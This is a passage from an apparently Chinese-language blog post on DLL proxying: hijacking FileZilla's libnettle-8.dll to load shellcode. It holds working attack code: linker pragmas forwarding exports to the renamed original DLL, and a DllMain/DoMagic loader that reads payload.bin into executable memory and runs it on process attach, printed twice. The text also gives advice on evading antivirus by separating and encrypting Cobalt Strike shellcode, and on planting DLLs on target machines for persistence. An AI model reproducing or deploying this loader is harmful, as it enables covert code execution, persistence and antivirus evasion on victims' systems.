&quot;/export:nettle_siv_cmac_decrypt_message=tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_encrypt_message=tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_set_key=tmp2BF5.nettle_siv_cmac_set_key,@438&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128=tmp2BF5.nettle_twofish128,@439&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128_set_key=tmp2BF5.nettle_twofish128_set_key,@440&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192=tmp2BF5.nettle_twofish192,@441&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192_set_key=tmp2BF5.nettle_twofish192_set_key,@442&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256=tmp2BF5.nettle_twofish256,@443&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256_set_key=tmp2BF5.nettle_twofish256_set_key,@444&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_decrypt=tmp2BF5.nettle_twofish_decrypt,@445&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_encrypt=tmp2BF5.nettle_twofish_encrypt,@446&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_set_key=tmp2BF5.nettle_twofish_set_key,@447&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_digest=tmp2BF5.nettle_umac128_digest,@448&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_key=tmp2BF5.nettle_umac128_set_key,@449&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_nonce=tmp2BF5.nettle_umac128_set_nonce,@450&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_update=tmp2BF5.nettle_umac128_update,@451&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_digest=tmp2BF5.nettle_umac32_digest,@452&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_key=tmp2BF5.nettle_umac32_set_key,@453&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_nonce=tmp2BF5.nettle_umac32_set_nonce,@454&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_update=tmp2BF5.nettle_umac32_update,@455&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_digest=tmp2BF5.nettle_umac64_digest,@456&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_key=tmp2BF5.nettle_umac64_set_key,@457&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_nonce=tmp2BF5.nettle_umac64_set_nonce,@458&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_update=tmp2BF5.nettle_umac64_update,@459&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_digest=tmp2BF5.nettle_umac96_digest,@460&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_key=tmp2BF5.nettle_umac96_set_key,@461&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_nonce=tmp2BF5.nettle_umac96_set_nonce,@462&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_update=tmp2BF5.nettle_umac96_update,@463&quot;)#pragma comment(linker, &quot;/export:nettle_version_major=tmp2BF5.nettle_version_major,@464&quot;)#pragma comment(linker, &quot;/export:nettle_version_minor=tmp2BF5.nettle_version_minor,@465&quot;)#pragma comment(linker, &quot;/export:nettle_xrealloc=tmp2BF5.nettle_xrealloc,@466&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_decrypt_message=tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_encrypt_message=tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_decrypt_key=tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_encrypt_key=tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_decrypt_message=tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_encrypt_message=tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_decrypt_key=tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_encrypt_key=tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;)#pragma comment(linker, &quot;/export:nettle_xts_decrypt_message=tmp2BF5.nettle_xts_decrypt_message,@475&quot;)#pragma comment(linker, &quot;/export:nettle_xts_encrypt_message=tmp2BF5.nettle_xts_encrypt_message,@476&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_fast_reseed=tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_init=tmp2BF5.nettle_yarrow256_init,@478&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_is_seeded=tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_needed_sources=tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_random=tmp2BF5.nettle_yarrow256_random,@481&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_seed=tmp2BF5.nettle_yarrow256_seed,@482&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_slow_reseed=tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_update=tmp2BF5.nettle_yarrow256_update,@484&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_estimate=tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_init=tmp2BF5.nettle_yarrow_key_event_init,@486&quot;)DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;}BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} Domagic函数从payload.bin中读取shellcode，之后使用virtualmalloc和malloc函数分配相应大小的内存空间，再将指针指向对应的空间执行shellcode 12345678910111213141516171819202122232425DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;} Dllmain函数为dll函数的入口 12345678910111213141516171819202122232425BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} 原文章的原理如下图 A：fzsftp.exe B:tmp2BF5.dll(正常的libnettle-8.dll文件) C:恶意libnettle-8.dll E:payload.bin 存储shellcode 实际操作中用cs直接生成的shellcode已经被杀软识别，因此免杀效果很差，将shellcode分离后远程加载并进行加密后才可以实现免杀。在实战中可以根据目标机器上安装的软件生成dll文件并替换，实现权限维持 参考 https://cloud.tencent.com/developer/article/1739263 https://github.com/Flangvik/SharpDllProxy https://gist.github.com/securitytube/c956348435cc90b8e1f7","link":"/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/"}],"tags":[],"categories":[]}